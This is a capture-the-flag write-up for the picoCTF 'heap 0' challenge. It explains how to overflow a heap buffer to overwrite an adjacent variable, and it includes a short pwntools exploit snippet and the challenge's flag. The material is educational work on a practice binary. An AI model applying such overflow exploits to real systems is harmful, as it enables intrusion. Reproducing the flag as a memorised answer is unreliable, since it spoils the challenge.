# heap 0

**Link**: https://play.picoctf.org/practice/challenge/438

**difficulty**: easy

## Description

Are overflows just a stack concern?

## Resources

**chall**: binary file

**chall.c**: source code

## How to solve

By running the binary you receive 2 leaks:

    Heap State:
    +-------------+----------------+
    [*] Address   ->   Heap Data
    +-------------+----------------+
    [*]   0x64dcc00c26b0  ->   pico
    +-------------+----------------+
    [*]   0x64dcc00c26d0  ->   bico
    +-------------+----------------+

By looking at the code it is easy to see that the goal is to change the value inside the second address in order to be a value different from bico. Also there is a menu that helps for navigating through this process

    1. Print Heap:          (print the current state of the heap)
    2. Write to buffer:     (write to your own personal block of data on the heap)
    3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
    4. Print Flag:          (Try to print the flag, good luck)
    5. Exit

Example snippet (inside your exploit script):

    infomations = io.recvuntil(b'Enter your choice: ')
    address1 = int(infomations[341:355], 16)
    address2 = int(infomations[406:420], 16)
    diff = address2 - address1
    io.sendline(b'2') 
    io.recvuntil(b'Data for buffer: ')
    io.sendline(b'A'*diff+b'b') 
    io.recvuntil(b'Enter your choice: ')
    io.sendline(b'4') 
    print(io.recvall(1))

At the end you should get the flag:

    picoCTF{my_first_heap_overflow_4fa6dd49}

